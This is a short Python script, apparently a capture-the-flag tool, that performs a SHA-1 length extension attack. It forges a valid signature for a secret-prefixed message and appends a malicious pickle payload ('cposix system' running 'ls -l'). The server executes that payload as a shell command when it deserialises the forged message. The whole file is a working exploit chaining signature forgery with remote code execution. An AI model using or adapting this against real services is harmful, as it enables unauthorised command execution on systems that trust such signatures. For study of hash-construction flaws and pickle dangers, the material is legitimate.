#!/usr/bin/python
#
# sha1 padding/length extension attack
# by rd@vnsecurity.net
#
from hashlib import sha1
import sys
import base64
from shaext import shaext
from urllib import urlencode

"""
if len(sys.argv) != 5:
	print "usage: %s <keylen> <original_message> <original_signature> <text_to_append>"  % sys.argv[0]
	exit(0)
"""
print "/!\\ Source modif, normal si ca marche pas bien"

"""
key = "123456"
keylen = len(key)
orig_msg = "V1:3518a1b391035945d7a95d0c20d0d5ad537ef22c:soka\np0"
orig_sig = "00c31331f83d688ef9fc27e8447cee1c70b11cad"
add_msg = "\ncposix\nsystem\np1\n(S'ls -l'\np2\ntp3\nRp4\n."
"""

key = "123456"
keylen = len(key)
orig_msg = "V1:3518a1b391035945d7a95d0c20d0d5ad537ef22c:soka\np0"
orig_sig = sha1(key + orig_msg).hexdigest()
add_msg = "\ncposix\nsystem\np1\n(S'ls -l'\np2\ntp3\nRp4\n."

if len(sys.argv) > 3:
	keylen = int(sys.argv[1])
	orig_msg = sys.argv[2]
	orig_sig = sys.argv[3]
	add_msg = sys.argv[4]


ext = shaext(orig_msg, keylen, orig_sig)
ext.add(add_msg)

(new_msg, new_sig)= ext.final()

print "new msg: " + repr(new_msg)
print "base64: " + base64.b64encode(new_msg)
print "new sig: " + new_sig
print "good sig: %s" % (sha1(key + new_msg).hexdigest())